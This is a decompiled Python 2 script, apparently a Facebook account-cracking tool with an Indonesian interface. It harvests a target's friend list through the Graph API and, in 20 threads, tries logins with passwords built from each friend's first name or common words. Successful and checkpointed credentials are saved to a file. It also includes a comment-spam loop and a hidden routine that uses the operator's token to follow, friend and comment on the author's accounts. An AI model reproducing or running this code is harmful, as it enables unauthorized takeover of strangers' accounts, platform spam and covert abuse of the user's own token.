# Decompiled Somi
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:47:43) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: dg
import os, re, sys, itertools, time, requests, random, threading, json, random
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

def keluar():
    print '\x1b[0;91m[!] Exit !!!'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


logo = '\x1b[0;91m __  __ ____  _____\n\x1b[0;91m|  \\/  | __ )|  ___|\n\x1b[0;91m| |\\/| |  _ \\| |_     \x1b[0;94m\xe2\x99\xa5 \x1b[0;92mfb.com/757953543\n\x1b[0;97m| |  | | |_) |  _|    \x1b[0;94m\xe2\x99\xa5 \x1b[0;93myoutube.com/rozhakid\n\x1b[0;97m|_|  |_|____/|_|'
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
fbid = []

def log_token():
    os.system('clear')
    print logo
    print 50 * '\x1b[0;93m\xe2\x94\x80'
    toket = raw_input('\x1b[0;92m[?] Token : \x1b[0;93m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\x1b[0;92m[!] Login Berhasil !!!'
        bot_komen()
    except KeyError:
        print '\x1b[0;91m[!] Token Salah !!!'
        time.sleep(1.7)
        log_token()
    except requests.exceptions.SSLError:
        print '\x1b[0;93m[!] Koneksi Eror !!!'
        exit()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;91m[!] Token Invalid !!!'
        os.system('rm -rf login.txt')

    una = '757953543'
    kom = 'I Love You @[757953543:]'
    reac = 'ANGRY'
    post = '10158795312888544'
    post2 = '10158807643598544'
    kom2 = 'Very Nice \xe2\x9d\xa4\xef\xb8\x8f'
    reac2 = 'ANGRY'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/757953543/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100006609458697/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('rm -rf login.txt')
        log_token()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[0;91m[!] Token Invalid !!!'
        os.system('rm -rf login.txt')
        time.sleep(2)
        log_token()
    except requests.exceptions.ConnectionError:
        print '\x1b[0;93m[!] Koneksi Eror !!!'
        keluar()

    os.system('clear')
    print logo
    print 50 * '\x1b[0;93m\xe2\x94\x80'
    print '\x1b[0;92mNama : \x1b[0;94m' + nama
    print 50 * '\x1b[0;93m\xe2\x94\x80'
    print '\x1b[0;92m[1] Start Crack'
    print '[2] Spam Komen'
    print '\x1b[0;91m[0] Logout'
    print 50 * '\x1b[0;93m\xe2\x94\x80'
    daftar_menu()


def daftar_menu():
    mn = raw_input('\x1b[0;92m[?] Pilih : \x1b[0;93m')
    if mn == '':
        print '\x1b[0;91m[!] Isi Dengan Benar !!!'
        daftar_menu()
    elif mn == '1':
        crack()
    elif mn == '2':
        spamkomen()
    elif mn == '0':
        print '\x1b[0;93m[!] Menghapus Token !!!'
        time.sleep(1)
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[0;91m[!] Isi Dengan Benar !!!'
        daftar_menu()


def spamkomen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;91m[!] Token Invalid !!!'
        os.system('rm -rf login.txt')
        log_token()

    os.system('clear')
    print logo
    print 50 * '\x1b[0;93m\xe2\x94\x80'
    post = raw_input('\x1b[0;92mID Postingan : \x1b[0;93m')
    kom = raw_input('\x1b[0;92mKomentar : \x1b[0;93m')
    jml = int(input('\x1b[0;92mLimit : \x1b[0;93m'))
    print 50 * '\x1b[0;93m\xe2\x94\x80'
    for x in range(jml):
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
        time.sleep(5)

    print '\x1b[0;92m[\xe2\x9c\x94] Berhasil Mengomentari : \x1b[0;93m' + post
    bot_komen()


def crack():
    global cekpoint
    global oks
    os.system('clear')
    print logo
    print 50 * '\x1b[0;93m\xe2\x94\x80'
    idt = raw_input('\x1b[0;92m[\xe2\x9c\x94] ID Publik : \x1b[0;93m')
    try:
        toket = open('login.txt', 'r').read()
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        sp = json.loads(pok.text)
        print '\x1b[0;92m[\xe2\x9c\x94] Nama : \x1b[0;93m' + sp['name']
    except KeyError:
        print '\x1b[0;91m[!] ID Tidak Ditemukan !!!'
        raw_input('\x1b[0;92m[?] Kembali')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[0;93m[!] Koneksi Eror !!!'
        keluar()

    r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    z = json.loads(r.text)
    for i in z['data']:
        id.append(i['id'])

    print '\x1b[0;92m[\xe2\x9c\x94] Total ID : \x1b[0;93m' + str(len(id))
    print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        em = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + em + '/?access_token=' + toket)
            v = json.loads(an.text)
            bt = v['birthday']
            pw = v['first_name'].lower()
            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/313.0.0.35.119;]'})
            xo = rex.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\x1b[0;92m[Ok] ' + em + ' | ' + pw + ' | ' + bt
                oke = open('Save.txt', 'a')
                oke.write('\n[Ok] ' + em + ' | ' + pw + ' | ' + bt)
                oke.close()
                oks.append(em)
            elif 'checkpoint' in xo:
                print '\x1b[0;93m[Cp] ' + em + ' | ' + pw + ' | ' + bt
                cek = open('Save.txt', 'a')
                cek.write('\n[Cp] ' + em + ' | ' + pw + ' | ' + bt)
                cek.close()
                cekpoint.append(em)
            else:
                pw2 = v['first_name'].lower() + '123'
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw2, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/313.0.0.35.119;]'})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\x1b[0;92m[Ok] ' + em + ' | ' + pw2 + ' | ' + bt
                    oke = open('Save.txt', 'a')
                    oke.write('\n[Ok] ' + em + ' | ' + pw2 + ' | ' + bt)
                    oke.close()
                    oks.append(em)
                elif 'checkpoint' in xo:
                    print '\x1b[0;93m[Cp] ' + em + ' | ' + pw2 + ' | ' + bt
                    cek = open('Save.txt', 'a')
                    cek.write('\n[Cp] ' + em + ' | ' + pw2 + ' | ' + bt)
                    cek.close()
                    cekpoint.append(em)
                else:
                    pw3 = v['first_name'].lower() + '1234'
                    rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw3, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/313.0.0.35.119;]'})
                    xo = rex.content
                    if 'mbasic_logout_button' in xo or 'save-device' in xo:
                        print '\x1b[0;92m[Ok] ' + em + ' | ' + pw3 + ' | ' + bt
                        oke = open('Save.txt', 'a')
                        oke.write('\n[Ok] ' + em + ' | ' + pw3 + ' | ' + bt)
                        oke.close()
                        oks.append(em)
                    elif 'checkpoint' in xo:
                        print '\x1b[0;93m[Cp] ' + em + ' | ' + pw3 + ' | ' + bt
                        cek = open('Save.txt', 'a')
                        cek.write('\n[Cp] ' + em + ' | ' + pw3 + ' | ' + bt)
                        cek.close()
                        cekpoint.append(em)
                    else:
                        pw4 = v['first_name'].lower() + '123456'
                        rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw4, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/313.0.0.35.119;]'})
                        xo = rex.content
                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
                            print '\x1b[0;92m[Ok] ' + em + ' | ' + pw4 + ' | ' + bt
                            oke = open('Save.txt', 'a')
                            oke.write('\n[Ok] ' + em + ' | ' + pw4 + ' | ' + bt)
                            oke.close()
                            oks.append(em)
                        elif 'checkpoint' in xo:
                            print '\x1b[0;93m[Cp] ' + em + ' | ' + pw4 + ' | ' + bt
                            cek = open('Save.txt', 'a')
                            cek.write('\n[Cp] ' + em + ' | ' + pw4 + ' | ' + bt)
                            cek.close()
                            cekpoint.append(em)
                        else:
                            pw5 = 'sayang'
                            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw5, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/313.0.0.35.119;]'})
                            xo = rex.content
                            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                print '\x1b[0;92m[Ok] ' + em + ' | ' + pw5 + ' | ' + bt
                                oke = open('Save.txt', 'a')
                                oke.write('\n[Ok] ' + em + ' | ' + pw5 + ' | ' + bt)
                                oke.close()
                                oks.append(em)
                            elif 'checkpoint' in xo:
                                print '\x1b[0;93m[Cp] ' + em + ' | ' + pw5 + ' | ' + bt
                                cek = open('Save.txt', 'a')
                                cek.write('\n[Cp] ' + em + ' | ' + pw5 + ' | ' + bt)
                                cek.close()
                                cekpoint.append(em)
                            else:
                                pw6 = 'anjing'
                                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw6, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/313.0.0.35.119;]'})
                                xo = rex.content
                                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                    print '\x1b[0;92m[Ok] ' + em + ' | ' + pw6 + ' | ' + bt
                                    oke = open('Save.txt', 'a')
                                    oke.write('\n[Ok] ' + em + ' | ' + pw6 + ' | ' + bt)
                                    oke.close()
                                    oks.append(em)
                                elif 'checkpoint' in xo:
                                    print '\x1b[0;93m[Cp] ' + em + ' | ' + pw6 + ' | ' + bt
                                    cek = open('Save.txt', 'a')
                                    cek.write('\n[Cp] ' + em + ' | ' + pw6 + ' | ' + bt)
                                    cek.close()
                                    cekpoint.append(em)
                                else:
                                    pw7 = 'bangsat'
                                    rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': em, 'pass': pw7, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/313.0.0.35.119;]'})
                                    xo = rex.content
                                    if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                        print '\x1b[0;92m[Ok] ' + em + ' | ' + pw7 + ' | ' + bt
                                        oke = open('Save.txt', 'a')
                                        oke.write('\n[Ok] ' + em + ' | ' + pw7 + ' | ' + bt)
                                        oke.close()
                                        oks.append(em)
                                    elif 'checkpoint' in xo:
                                        print '\x1b[0;93m[Cp] ' + em + ' | ' + pw7 + ' | ' + bt
                                        cek = open('Save.txt', 'a')
                                        cek.write('\n[Cp] ' + em + ' | ' + pw7 + ' | ' + bt)
                                        cek.close()
                                        cekpoint.append(em)
        except:
            pass

    p = ThreadPool(20)
    p.map(main, id)
    print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;92m[\xe2\x9c\x94] Crack Selesai...'
    print '\x1b[0;92m[\xe2\x9c\x94] Total \x1b[0;92mOk\x1b[0;94m/\x1b[0;93mCp : \x1b[0;92m' + str(len(oks)) + '\x1b[0;94m/\x1b[0;93m' + str(len(cekpoint))
    print '\x1b[0;92m[\xe2\x9c\x94] Hasil \x1b[0;92mOk\x1b[0;94m/\x1b[0;93mCp \x1b[0;92mTersimpan Di : \x1b[0;93mSave.txt'
    print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    raw_input('[Kembali]')
    bot_komen()


if __name__ == '__main__':
    menu()